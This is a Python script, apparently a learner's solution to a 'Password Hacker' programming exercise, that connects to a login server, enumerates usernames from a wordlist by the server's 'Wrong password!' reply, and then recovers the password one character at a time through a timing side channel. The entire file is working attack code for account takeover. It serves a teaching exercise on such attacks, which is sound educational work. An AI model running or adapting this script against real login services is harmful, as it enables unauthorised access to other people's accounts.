# write your code here
import json
import socket
import sys
import time
from string import ascii_letters, digits

ADDRESS = (sys.argv[1], int(sys.argv[2]))


def main():
    correct_login = ""
    correct_password = ""
    usialy_time = 0.0
    with socket.socket() as my_socket:
        with open("/home/ivan/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt", "r") as file:
            my_socket.connect(ADDRESS)
            for login in file:
                login = login.strip("\n")
                send_login_password = json.dumps(
                    {
                        "login": login,
                        "password": ""
                    }
                )

                start = time.perf_counter()

                my_socket.send(send_login_password.encode())
                unswer_dict = json.loads(my_socket.recv(1024).decode())

                end = time.perf_counter()
                total_time = end - start
                usialy_time = total_time

                if unswer_dict["result"] == "Wrong password!":
                    correct_login = login
                    break

            while True:
                for i in ascii_letters + digits:
                    password = correct_password + i
                    send_login_password = json.dumps(
                        {
                            "login": correct_login,
                            "password": password
                        }
                    )

                    start = time.perf_counter()

                    my_socket.send(send_login_password.encode())
                    unswer_dict = json.loads(my_socket.recv(1024).decode())
                    end = time.perf_counter()
                    total_time = end - start
                    exeption_time = total_time

                    if unswer_dict["result"] == "Wrong password!":
                        if usialy_time < exeption_time:
                            correct_password = password
                            break
                    elif unswer_dict["result"] == "Connection success!":
                        print(send_login_password)
                        return 0


main()
